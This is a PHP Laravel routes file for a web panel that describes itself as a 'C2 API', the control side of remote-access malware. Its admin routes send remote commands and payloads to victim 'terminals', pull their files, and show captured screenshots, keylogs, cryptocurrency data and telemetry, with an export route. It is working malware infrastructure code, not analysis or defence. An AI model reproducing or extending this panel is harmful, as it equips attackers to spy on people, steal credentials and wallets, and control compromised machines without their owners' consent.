<?php

use Illuminate\Support\Facades\Route;

// Home
Route::get('/', function () {
    return view('welcome');
});

// Admin Routes
Route::get('/admin', function () {
    return redirect('/admin/dashboard');
})->name('admin');
Route::get('/admin/dashboard', [App\Http\Controllers\Admin\AdminController::class, 'index'])->name('admin.dashboard');
Route::get('/admin/client/{id}', [App\Http\Controllers\Admin\AdminController::class, 'clientManage'])->name('admin.client');
Route::post('/admin/command', [App\Http\Controllers\Admin\AdminController::class, 'remoteCommand'])->name('admin.command');
Route::post('/admin/upload-payload', [App\Http\Controllers\Admin\AdminController::class, 'uploadAndSendPayload'])->name('admin.upload');
Route::get('/admin/terminal-details', [App\Http\Controllers\Admin\AdminController::class, 'terminalDetails'])->name('admin.terminal.details');
Route::get('/admin/files/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'listFiles'])->name('admin.files.list');
Route::get('/admin/files/{terminalId}/{filename}', [App\Http\Controllers\Admin\AdminController::class, 'downloadFile'])->name('admin.files.download');
Route::get('/admin/screenshots/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'screenshotsView'])->name('admin.screenshots');
Route::get('/admin/keylogs/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'keylogsView'])->name('admin.keylogs');
Route::get('/admin/crypto/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'cryptoView'])->name('admin.crypto');
Route::get('/admin/telemetry/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'telemetryView'])->name('admin.telemetry');
Route::get('/admin/export/{terminalId}/{type}', [App\Http\Controllers\Admin\AdminController::class, 'exportData'])->name('admin.export');

// Redirection for cleaner API access if needed or simple health check
Route::get('/api-health', function() {
    return response()->json(['status' => 'ok', 'message' => 'C2 API is reachable']);
});
